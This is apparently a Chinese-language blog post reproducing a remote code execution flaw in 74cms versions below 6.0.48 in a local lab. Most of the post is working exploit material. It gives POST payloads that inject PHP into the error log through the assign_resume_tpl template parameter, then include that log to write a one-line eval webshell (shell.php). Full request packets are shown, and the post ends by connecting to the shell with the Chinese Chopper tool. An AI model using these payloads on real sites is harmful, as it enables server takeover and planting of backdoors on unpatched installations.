> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/erBzIapx1bz8f1ArWwwBwQ)

**00X1 测试环境**  

骑士 CMS 6.0.48以下均存在此漏洞，本文复现使用骑士cms 6.0.20，下载地址：  

```
http://www.74cms.com/download/index.html
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNb01dKhc9HHiaQyFCaEGEDVNLTAiar4EceJ06LicibMfuAH50DzoiaZjWiamzjrToR6DaYUWwINMD5xae6w/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

注意骑士cms不支持php7.x，复现php环境为php5.6。安装包下载完毕后直接在phpstudy下，访问upload/install.php进行安装，根据提示逐步安装即可。  

![图片](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNb01dKhc9HHiaQyFCaEGEDVNv5nMuHheOI0jic8ibeUVmia6SOPxghMiajBoqW4MZzC3uJImznlZOwamiaQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

* * *

**00X2 漏洞复现**

**1.模板注入写入文件，POC**  

```
`http://192.168.23.128/74cms_v6.0.20/upload/index.php?m=home&a=assign_resume_tpl``POST:``variable=1&tpl=<?php fputs(fopen("shell.php","w"),"<?php eval(\$_POST[x]);?>")?>; ob_flush();?>/r/n<qscms/company_show 列表名="info" 企业id="$_GET['id']"/>`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

请求包：  

```
`POST /74cms_v6.0.20/upload/index.php?m=home&a=assign_resume_tpl HTTP/1.1``Host: 192.168.23.128``Content-Length: 155``Cache-Control: max-age=0``Upgrade-Insecure-Requests: 1``Origin: http://192.168.23.128``Content-Type: application/x-www-form-urlencoded``User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36``Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9``Referer: http://192.168.23.128/74cms_v6.0.20/upload/index.php?m=home&a=assign_resume_tpl``Accept-Encoding: gzip, deflate``Accept-Language: zh-CN,zh;q=0.9,vi;q=0.8,id;q=0.7``Cookie: PHPSESSID=ktl5a9hhct39p0vsnh7pjc2nhn; think_language=zh-CN; think_template=default``Connection: close``variable=1&tpl=<?php fputs(fopen("shell.php","w"),"<?php eval(\$_POST[x]);?>")?>; ob_flush();?>/r/n<qscms/company_show 列表名="info" 企业id="$_GET['id']"/>`
```

根据报错，发现日志已经记录了错误，日志物理路径：  

```
\phpstudy_pro\WWW\data\Runtime\Logs\Home
```

日志文件名根据日期命名：  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**2.包含日志文件getshell**

poc：

```
`http://192.168.23.128/74cms_v6.0.20/upload/index.php?m=home&a=assign_resume_tpl``POST:``variable=1&tpl=data/Runtime/Logs/Home/20_12_14.log`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

请求包：  

```
`POST /74cms_v6.0.20/upload/index.php?m=home&a=assign_resume_tpl HTTP/1.1``Host: 192.168.23.128``Content-Length: 58``Cache-Control: max-age=0``Upgrade-Insecure-Requests: 1``Origin: http://192.168.23.128``Content-Type: application/x-www-form-urlencoded``User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36``Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9``Referer: http://192.168.23.128/74cms_v6.0.20/upload/index.php?m=home&a=assign_resume_tpl``Accept-Encoding: gzip, deflate``Accept-Language: zh-CN,zh;q=0.9,vi;q=0.8,id;q=0.7``Cookie: PHPSESSID=ktl5a9hhct39p0vsnh7pjc2nhn; think_language=zh-CN; think_template=default``Connection: close``variable=1&tpl=data%2FRuntime%2FLogs%2FHome%2F20_12_14.log`
```

包含文件的内容为：  

```
<?php fputs(fopen("shell.php","w"),"<?php eval(\$_POST[x]);?>")?>
```

在根目录下写入shell.php文件，内容为一句话木马，包含成功：  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

菜刀连接：  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

以上：

```
`# shell写入日志``http://192.168.23.128/74cms_v6.0.20/upload/index.php?m=home&a=assign_resume_tpl``POST:``variable=1&tpl=<?php fputs(fopen("shell.php","w"),"<?php eval(\$_POST[x]);?>")?>; ob_flush();?>/r/n<qscms/company_show 列表名="info" 企业id="$_GET['id']"/>``# 包含写shell``http://192.168.23.128/74cms_v6.0.20/upload/index.php?m=home&a=assign_resume_tpl``POST:``variable=1&tpl=data/Runtime/Logs/Home/20_12_14.log``# poc来源：``https://mp.weixin.qq.com/s/4-36O4OaWxu2jX2pzb5_Wg`
```

参考链接：  

https://xz.aliyun.com/t/8596#toc-6

https://mp.weixin.qq.com/s/4-36O4OaWxu2jX2pzb5_Wg

* * *

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)